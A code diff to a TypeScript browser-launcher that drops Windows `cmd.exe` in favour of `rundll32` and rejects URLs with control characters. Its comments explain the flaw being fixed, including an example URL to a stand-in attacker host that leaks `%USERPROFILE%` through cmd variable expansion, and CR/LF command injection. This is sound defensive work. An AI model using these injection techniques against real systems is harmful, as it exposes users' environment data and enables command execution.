@@ -1,22 +1,16 @@
 import { spawn } from 'node:child_process'
 
 /**
- * Escapes the characters `cmd.exe` treats as syntax.
+ * C0 controls and DEL, which no URL has any business carrying.
  *
- * On Windows the launcher has to go through `cmd`, and `cmd` re-parses the
- * command line *after* the child-process layer has built it. That layer only
- * quotes arguments containing whitespace or quotes, so a bare `&` survives into
- * `cmd` as a command separator — and every OAuth authorization URL is a string
- * of `&`-separated parameters. Without this the browser receives the URL
- * truncated at the first parameter and `cmd` tries to execute the remainder.
- *
- * `%` is deliberately left alone: `^` does not escape it, and an unmatched `%`
- * (which is what percent-encoding produces) is already passed through
- * literally.
+ * The URL syntax has percent-encoding for every byte that needs one, so a
+ * literal control character in a URL is never the author's intent — it is
+ * either corruption or a line break someone wants a downstream parser to act
+ * on. The WHATWG URL parser makes that worse rather than better: it strips TAB,
+ * CR and LF as a silent repair, so a value containing them can pass a
+ * `new URL(…).protocol` check and still reach a launcher with the break intact.
  */
-export function escapeForCmd(value: string): string {
-  return value.replace(/[&|^<>()]/g, (character) => `^${character}`)
-}
+const CONTROL_CHARACTERS = /[\u0000-\u001F\u007F]/
 
 /**
  * Whether launching a browser has been switched off for this process.
@@ -34,11 +28,51 @@ function browserDisabled(): boolean {
  * Opens a URL in the user's default browser.
  *
  * Implemented with `spawn` rather than a dependency like `open` to keep the
- * package dependency-free. Uses argument arrays (never a shell string), so on
- * macOS and Linux the URL reaches the launcher untouched.
+ * package dependency-free. Uses argument arrays (never a shell string), so the
+ * URL reaches the launcher untouched on every platform.
+ *
+ * ## Why Windows no longer goes through `cmd.exe`
+ *
+ * `start` is a `cmd` builtin, so launching with it meant spawning `cmd /c start
+ * "" <url>` — and `cmd` re-parses the command line *after* the child-process
+ * layer has built it. That second parse was the whole problem, and it could not
+ * be escaped away:
+ *
+ * - `escapeForCmd` prefixed `&|^<>()` with `^`, which handled the metacharacter
+ *   every authorization URL is full of. It could not handle `%`. `^` does not
+ *   escape `%` in `cmd`, there is no sequence that does on a command line, and
+ *   so `https://evil.test/?x=%USERPROFILE%` had the variable expanded before
+ *   the browser ever saw it — sending the user's home path, or `%PATH%`, or any
+ *   other environment variable, to the attacker's server the moment the tab
+ *   opened. That gap was known and documented as "deliberately left alone".
+ * - `^` does not escape CR or LF either. A carriage return in the command line
+ *   ends one command and starts the next, so a URL carrying one is command
+ *   injection outright, and the URL is not always ours: `providerFromDiscovery`
+ *   takes `authorization_endpoint` from a remote document, and the URL parser
+ *   strips CR and LF while validating, so the string that was checked and the
+ *   string that arrived here were not the same string.
+ *
+ * Neither is a patch to the escaping. They are both consequences of handing a
+ * URL to a shell at all, so the shell is gone. `rundll32 url.dll,
+ * FileProtocolHandler <url>` is Microsoft's documented way to open a URL with
+ * the registered handler; it receives the URL as an argv entry, performs no
+ * re-parse, expands no `%VAR%`, and has no notion of a command separator.
+ *
+ * The control-character refusal below is belt-and-braces for the same class of
+ * input, and stays because it is not Windows-specific: `xdg-open` is a shell
+ * script, and a URL is not a place a control character can arrive innocently.
  */
 export function openBrowser(url: string): void {
   if (browserDisabled()) {
+    return
+  }
+
+  // No spawn at all rather than a sanitised one. Every URL this library builds
+  // itself is already clean, so a control character here means the value came
+  // from somewhere that should not have been trusted with it, and quietly
+  // repairing it would hide that. The caller falls back to printing the URL,
+  // which is a working login rather than a broken one.
+  if (CONTROL_CHARACTERS.test(url)) {
     return
   }
 
@@ -51,9 +85,8 @@ export function openBrowser(url: string): void {
     command = 'open'
     args = [url]
   } else if (platform === 'win32') {
-    /* `start` is a cmd builtin; the empty string is the required window title. */
-    command = 'cmd'
-    args = ['/c', 'start', '', escapeForCmd(url)]
+    command = 'rundll32'
+    args = ['url.dll,FileProtocolHandler', url]
   } else {
     command = 'xdg-open'
     args = [url]
